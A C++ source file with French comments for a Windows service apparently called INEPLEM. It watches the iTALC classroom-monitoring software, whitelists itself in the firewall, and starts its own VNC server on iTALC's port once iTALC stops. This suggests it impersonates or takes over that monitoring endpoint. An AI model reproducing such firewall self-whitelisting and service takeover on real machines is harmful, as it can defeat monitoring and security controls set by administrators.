#include <iostream>
#include <string>

#include "serviceCore.h"
#include "watchdog.h"
#include "net.h"
#include "vncServer.h"

/* ServiceCore::ServiceCore: Constructeur qui initialise toutes les valeurs
 */
ServiceCore::ServiceCore(){
	this->m_italcUsername = std::string("");
	this->m_italcUsernameNull = 1;
	this->m_italcAuthtype = VNC_MSAUTH;
	this->m_italcAuthresponse = VNC_DROP;
	this->m_italcSleep = 0;
}

/* ServiceCore::start: Démare les différents composant du service
 * Aucun parramètre et aucun retour
 */
void ServiceCore::start(){
	std::cout << "[ServiceCore] Starting..." << std::endl;
	// On initialise la stack réseau de window
	initWSocket();

	// On démare le watchdog Italc
	this->m_watchdogThread = italcWatchdogThread(this);

	// On se whitelist dans le firewall
	whitelistFirewall();
	std::cout << "[ServiceCore] Firewall configured" << std::endl;

	// On attend que Italc soit arrêté
	while(this->m_italcSleep == 0) Sleep(50);

	// On démarre le serveur VNC
	this->m_vncServer = new VncServer(ITALC_PORT, this);
	this->m_vncServer->startThread();
}

/* ServiceCore::stop: Arrête les différents composant du service
 * Aucun parramètre et aucun retour
 */
void ServiceCore::stop(){
	std::cout << "[ServiceCore] Stopping..." << std::endl;
	// On arrète le watchdog Italc
	CloseHandle(this->m_watchdogThread);

	// On arrête le serveur VNC
	this->m_vncServer->stopThread();
	delete this->m_vncServer;
}

/* ServiceCore::italcSleep: Est appelée par le watchdog lorsque ITalc est arrêté
 * Aucun paramètre ni retour
 */
void ServiceCore::italcSleep(){
	this->m_italcSleep = 1;
}

/* ServiceCore::kill: Est appelée en cas d'erreur fatale et tue l'intégralité d'INEPLEM
 * Aucun paramètre ni retour
 */
void ServiceCore::kill(){
	this->stop();
	exit(1);
}